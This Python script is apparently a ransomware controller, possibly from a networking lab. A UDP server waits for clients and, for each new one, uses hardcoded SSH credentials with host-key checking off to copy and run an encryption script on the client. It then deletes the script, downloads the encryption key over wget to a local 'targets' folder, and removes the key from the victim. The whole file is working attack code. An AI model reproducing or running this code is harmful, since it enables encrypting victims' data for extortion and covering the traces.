from socket import *
import os

server_port = 6677
clients = []

def execute_remote_command(target_ip):
    username = "labredes"
    password = "labredes"
    source_file = "encrypt.py"
    remote_path = "/home/labredes/"
    target_port = 52369

    print("\n\n")
    # Copy the file to the remote server using scp
    command = f'sshpass -p "{password}" scp -o StrictHostKeyChecking=no {source_file} {username}@{target_ip}:{remote_path}'
    try:
        os.system(command)
        print(f"File {source_file} copied successfully to {username}@{target_ip}:{remote_path}")
    except Exception as e:
        print(f"Error copying file: {e}")
        return
    
    # Install the requirements on the remote server using ssh
    requirements = "pip3 install cryptography"
    command = f'sshpass -p "{password}" ssh -o StrictHostKeyChecking=no {username}@{target_ip} "{requirements}"'
    try:
        os.system(command)
        print("Requirements installed successfully")
    except Exception as e:
        print(f"Error installing requirements: {e}")

    # Execute the encryption on the remote server using ssh
    exec_script = f'python3 {remote_path}{source_file}'
    command = f'sshpass -p "{password}" ssh -o StrictHostKeyChecking=no {username}@{target_ip} "{exec_script}"'
    try:
        os.system(command)
        print("Data encryption was successfully")
    except Exception as e:
        print(f"Error executing command: {e}")
        
    # Remove the encryption file from the remote server using ssh
    command = f'sshpass -p "{password}" ssh -o StrictHostKeyChecking=no {username}@{target_ip} "rm {remote_path}{source_file}"'
    try:
        os.system(command)
        print(f"File removed successfully from {target_ip}")
    except Exception as e:
        print(f"Error removing file: {e}")

    # Get the key
    command = f'wget http://{target_ip}:{target_port}/thekey.key'
    try:
        os.system(command)
        print(f"File key was successfully downloaded from {target_ip}")
    except Exception as e:
        print(f"Error downloading the key: {e}")

    # Remove the key from the remote server using ssh
    command = f'sshpass -p "{password}" ssh -o StrictHostKeyChecking=no {username}@{target_ip} "rm {remote_path}thekey.key"'
    try:
        os.system(command)
        print(f"Key removed successfully from {target_ip}")
    except Exception as e:
        print(f"Error removing key: {e}")
    
    # Key    
    if  "thekey.key" in os.listdir():
        os.mkdir("targets")
        os.system(f"mv thekey.key ./targets/{target_ip}_key")
        print(f"Key moved to ./targets/{target_ip}_key")
    else:
        print("Key not found")
    
    print("\n\n")


def create_server_socket(port):
    try:
        server_socket = socket(AF_INET, SOCK_DGRAM)
        print("Server socket successfully created")
        server_socket.bind(('', port))
        print(f"The server is ready to receive on port {port}")
        return server_socket
    except Exception as e:
        print(f"Socket creation failed with error: {e}")
        return None

def receive_message(server_socket):
    message, client_ip = server_socket.recvfrom(2048)
    decoded_message = message.decode()
    print(f"Received from {client_ip}: {decoded_message}")
    target_ip = client_ip[0]
    if target_ip not in clients:
        clients.append(target_ip)
        execute_remote_command(target_ip)
    return decoded_message, client_ip

def send_message(server_socket, message, client_ip):
    modified_message = message.upper().encode()
    server_socket.sendto(modified_message, client_ip)

server_socket = create_server_socket(server_port)

if server_socket:
    while True:
        message, client_ip = receive_message(server_socket)
        send_message(server_socket, message, client_ip)
